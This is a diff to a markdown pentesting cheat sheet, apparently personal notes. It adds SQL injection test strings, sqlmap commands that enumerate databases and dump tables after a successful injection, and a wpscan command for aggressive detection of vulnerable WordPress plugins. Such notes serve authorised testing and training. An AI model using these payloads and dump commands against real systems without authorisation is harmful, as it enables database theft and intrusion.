@@ -37,12 +37,36 @@ gobuster vhost -u <url> --apend-domain -w <wordlist>
 
 ## SQLInjection
 Basic injections to test for strings:
-- `bla' or 1=1; -- `
-- `bla" or 1=1; -- `
-- `bla' or 1=1; # `
-- `bla" or 1=1; # `
+```
+bla' or 1=1; --
+bla" or 1=1; --
+bla' or 1=1; #
+bla" or 1=1; #
+```
 
 Use sqlmap the following way if the string is closed via `"` ([details](https://github.com/sqlmapproject/sqlmap/wiki/Usage#custom-injection-payload))
 ```
 sqlmap http://host.de/?para=anything --prefix'"'
 ```
+
+Use sqlmap by defining raw request (e.g. raw http in request.req):
+```
+sqlmap -r request.req -p <parameter>
+```
+
+sqlmap enumeration after successful injection:
+```bash
+# show all databases
+sqlmap <url> -p <parameter> --dbs
+# show all tables in database
+sqlmap <url> -p <parameter> -D <database> --tables
+# dump table
+sqlmap <url> -p <parameter> -D <database> -T <table> --dump
+```
+
+## Wordpress
+Use `wp-scan` to enumerate WordPress sites (use [api-token](https://wpscan.com/) to list vulnerabilities of found wp version/plugins).
+ ```bash
+ # enumerate vulnerable plugins (aggressive checks)
+wp-scan --url <url> --enumerate vp --plugins-detection aggressive
+ ```
